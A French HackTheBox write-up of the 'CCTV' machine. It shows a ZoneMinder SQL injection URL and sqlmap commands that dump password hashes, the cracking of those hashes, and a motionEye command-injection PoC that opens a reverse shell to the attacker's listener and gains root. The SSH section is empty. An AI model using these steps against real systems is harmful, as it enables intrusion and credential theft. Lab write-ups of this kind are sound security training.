# CCTV

Difficulté: Easy(20 pts)

OS        : Linux

Saison    : 10

CVSS      : CVE-2024-51482, CVE-2025-60787

Vecteur   : Web → SQLI → SSH → PrivEsc via Command Injection

### Summary

CCTV est une machine `hackthebox` focalisée sur l’exploitation d’un site web qui héberge une instance de `ZoneMinder`, l’injection SQL pour la récupération d’identifiants et l’escalade de privilèges via une plateforme de gestion `CCTV` vulnérable

### Host Resolution

La première étape fut d’associer l’adresse IP qui nous a été donnée au nom de domaine `cctv.htb` 

```bash
echo "10.129.20.172 cctv.htb" >> /etc/hosts
```

### Nmap Scan

La reconnaissance a débuté par un scan `nmap` de la cible afin de déterminer les ports ouverts

```bash
nmap -sC -sV -p- cctv.htb
```

On a obtenu

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 761d7398fa05f70b04c23bc47de6db4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Le scan révèle la présence de deux ports :

- Port HTTP (80)
- Port SSH (22)

### Web application Discovery

Après l’identification du port 80 comme principale surface d'attaque lors de l'analyse Nmap, nous avons interagi avec ce port via le navigateur à l’adresse

```
http://cctv.htb
```

![Image 1](/assets/cctv/1.png)

La page d'accueil présente le site web de surveillance vidéo `SecureVision`, proposant des services tels que la vidéosurveillance, les systèmes de contrôle d'accès, l'installation et la maintenance. Elle comportait également une option `Staff Login` pour la connexion. En nous y rendant on tombe sur un formulaire de connexion

![Image 2](/assets/cctv/2.png)

L’application utilise `ZoneMinder` qui est une solution de vidéosurveillance open source pour Linux permettant de capturer, analyser, enregistrer et surveiller des flux vidéo provenant de caméras IP, analogiques ou webcams. Généralement les utilisateurs de ce service gardent les mots de passe par défaut

 

```
Username: admin
Password: admin
```

Ces identifiants nous permettent donc d’accéder à la console d’administration

![Image 3](/assets/cctv/3.png)

On note que le site utilise la version `v1.37.63` de ZoneMinder. 

### ZoneMinder Vulnerability

Cette version présente la vulnérabilité répertoriée `CVE-2024-51482`. Il s'agit d'une injection SQL présente dans le fichier `web/ajax/event.php` de ZoneMinder, affectant les versions `1.37.*` jusqu'à `1.37.64*` incluse. Le correctif a été introduit en version `1.37.65`. Le point précis de la faille : lors de l'action `removetag`, le paramètre `$REQUEST['tid']` (l'identifiant du tag à supprimer) est injecté directement dans la requête SQL sans validation ni utilisation de requêtes préparées.

```php
$sql = "DELETE FROM Events_Tags WHERE TagId = $tagId";
dbQuery($sql);
```

La requête vulnérable est donc

```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=[PAYLOAD]
```

Pour vérifier la présence de la vulnérabilité nous allons tester deux valeurs pour les champs `tid`: `1` et `‘` pour voir la réaction du serveur

```
http://target/zm/index.php?view=request&request=event&action=removetag&tid=1
```

On obtient une réponse json du serveur

```json
{"result":"Ok","response":0}
```

Essayons l’autre requête modifiée

```json
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid='
```

On obtient une erreur 500 qui confirme la présence de la vulnérabilité

### Vulnerability exploitation

Nous interceptons notre requête précédente fructueuse que nous copions dans un fichier `request.txt`, car nous avons besoin de la valeur du cookie de session

```
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: AddMonitorsTable.bs.table.searchText=; AddMonitorsTable.bs.table.pageNumber=1; zmSkin=classic; zmCSS=base; ZMSESSID=pvs74anafp37udtg5se26f47fg
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Nous allons ensuite utiliser SQLMap pour détecter les bases de données présentes

```bash
sqlmap -r request.txt -p tid --batch --dbs
```

- `-r` pour indiquer le fichier qui contient notre requête
- `-p` pour indiquer le paramètre à tester
- `--batch` pour répondre oui à toutes les questions
- `--dbs` pour dire de récupérer les bases de données

SQLMap utilisera le time based SQLi qui consiste à tester des conditions et créer un retard de temps si vrai. On a pu récupérer ainsi les noms des bases de données

```

[*] information_schema
[*] performance_schema
[*] zm
```

La base de données intéressante ici est `zm`. Essayons de récupérer les tables de cette base de données

```bash
sqlmap -r request.txt -p tid --batch -D zm --tables
```

- `-D` pour indiquer la base de données à dumper
- `--tables` pour indiquer qu’on veut extraire la liste des tables de cette base de données

SQLMap a récupéré une liste de tables. La table intéressante dans cette liste est la table `Users`. Récupérons donc les données de cette table

```bash
sqlmap -r request.txt -p tid --batch -D zm -T Users --dump
```

- -T pour indiquer la table à dumper
- `—dump` pour indiquer qu’il faut dumper(récupérer les données)

On a donc récupéré une liste d’identifiants.

### Password cracking

Nous avons récupéré une liste d’utilisateurs et le hash de leurs mots de passe. Nous allons constituer un fichier `hashes.txt` avec ces informations

```
superadmin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
admin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

Nous allons ensuite utiliser `hash_identifier` pour déterminer le type de hash

![Image 4](/assets/cctv/4.png)

Le type de hash est donc `bcrypt`. Nous allons donc utiliser `JohnTheRipper` pour cracker ces hashs

```bash
john hashes.txt -w /usr/share/wordlists/rockyou.txt --format=bcrypt
```

On obtient le résultat

```
admin            (admin)
opensesame       (mark)
```

On a donc pu récupérer les informations de l’utilisateur `mark`. Le hash de `superadmin` n’a pas été craqué avec `rockyou.txt`, probablement dû à un mot de passe hors dictionnaire ou à un coût bcrypt élevé. Le port SSH étant ouvert essayons une connexion avec ces identifiants.

### SSH connection

### MotionEye Web Portal

Avec toutes ces informations en notre possession, nous pouvons nous rendre sur la page web de `motioneye`. Étant donné que nous ne pouvons pas lancer de navigateur sur le serveur, nous allons utiliser le SSH port forwarding.

```bash
ssh -L 8765:localhost:8765 mark@cctv.htb
```

On redirige le trafic entrant sur le port 8765 de notre machine locale vers le port `8765` de la cible, rendant le service accessible via `localhost`. Nous pouvons donc nous rendre dans notre navigateur à l’adresse

```
http://localhost:8765/
```

On tombe sur une page de connexion

![Image 5](/assets/cctv/5.png)

On entre les identifiants qu’on avait obtenus et on se retrouve sur une page d’administration

![Image 6](/assets/cctv/6.png)

La version actuelle de motionEye utilisée est `0.43.1b4`. Cette version présente la vulnérabilité répertoriée `CVE-2025-60787`. Il s’agit d'une OS Command Injection via des paramètres de configuration comme `image_file_name`. Les entrées utilisateur non sanitisées sont écrites dans les fichiers de config de Motion, permettant à un attaquant authentifié (admin) d'exécuter du code arbitraire au redémarrage de Motion. 

### MotionEye vulnerability exploitation

Le NVD référence un PoC complet sur cette vulnérabilité, mais le script que nous allons utiliser est celui de `gunzf0x` disponible sur github

```bash
git clone https://github.com/gunzf0x/CVE-2025-60787
cd CVE-2025-60787
```

Nous allons déterminer notre adresse IP puis lancer un écouteur sur notre machine pour obtenir un reverse shell

```bash
ip a
nc -lvnp 9001
```

Ensuite nous pouvons lancer le script pour obtenir un shell as root. 

```bash
python3 CVE-2025-60787.py revshell --url 'http://localhost:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i 10.10.15.170 --port 9001
```

- `--url` pour indiquer le lien du portail de MotionEye
- `--user` et —password pour l’username et le password de connexion
- `-i` pour indiquer notre adresse IP
- `--port` pour indiquer le port sur lequel tourne notre écouteur

On obtient ainsi un shell root

```bash
root@cctv:/etc/motioneye# id
uid=0(root) gid=0(root) groups=0(root)
```

### Quelques recommandations

1. Identifiants par défaut (ZoneMinder): Changer les credentials `admin/admin` et appliquer une politique de mot de passe forte. 
2. Injection SQL (CVE-2024-51482) : Mettre à jour ZoneMinder vers la version ≥ 1.37.65 qui corrige cette grosse faille de sécurité
3. Credentials en clair dans un fichier de config : Ne jamais stocker des mots de passe en clair dans les fichiers de configuration lisibles. Utiliser des permissions restrictives et des variables d’environnement 
4. OS Command Injection (CVE-2025-60787) : Mettre à jour MotionEye vers une version corrigée
5. Privilège Escalation: Appliquer le principe du moindre privilège for motioneye.service en ne lui donnant que les droits dont il a besoin
